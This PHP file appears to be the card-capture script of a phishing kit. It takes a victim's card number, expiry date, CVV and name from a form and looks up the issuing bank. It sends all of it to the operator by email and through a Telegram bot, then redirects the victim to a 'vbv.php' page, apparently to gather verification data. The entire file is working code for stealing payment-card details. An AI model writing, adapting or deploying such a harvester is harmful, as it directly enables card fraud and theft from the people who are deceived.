<?php

error_reporting(0);
session_start();
include "../config.php";
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;

$hostname = gethostbyaddr($ip);



$bin = $_POST['number'] ;
$bin = preg_replace('/\s/', '', $bin);
$bin = substr($bin,0,8);
$url = "https://lookup.binlist.net/".$bin;
$headers = array();
$headers[] = 'Accept-Version: 3';
$ch = curl_init();  
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$resp=curl_exec($ch);
curl_close($ch);
$xBIN = json_decode($resp, true);
$_SESSION['lastcc'] = mb_substr($_POST['number'], -4);
$_SESSION['bank_name'] = $xBIN["bank"]["name"];
$_SESSION['bank_scheme'] = strtoupper($xBIN["scheme"]);
$_SESSION['bank_type'] = strtoupper($xBIN["type"]);
$_SESSION['bank_brand'] = strtoupper($xBIN["brand"]);
$_SESSION['bank_country'] = $xBIN["country"]["name"];

$message = "[========== RZLT(Card)  ===========]\r\n";
$message .= "|Full Name 		 : ". $_SESSION["name"]."\r\n";
$message .= "|Card      	 : ".$_POST['number']."\r\n";
$message .= "|Exp                : ".$_POST['month']."/".$_POST['year']."\r\n";
$message .= "|Cvv       	 : ".$_POST['cvv']."\r\n";
$message .= "|Bank Name          : ".$_SESSION['bank_name']."\r\n";
$message .= "|Card Type       	 : ".$_SESSION['bank_type']."\r\n";
$message .= "|Card Brand       	 : ".$_SESSION['bank_brand']."\r\n";
$message .= "|Card Country       	 : ".$_SESSION['bank_country']."\r\n";
$message .= "[========= $ip ========]\r\n";
$send = $email; 
$subject = "(".$_SESSION["name"].") CVV RZLT $ip";
$headers = "From: [CH1_ **]<info@CH1.com>";
mail($send,$subject,$message,$headers);

file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );


echo"<script>window.top.location.href = './vbv.php'; </script>";


?>
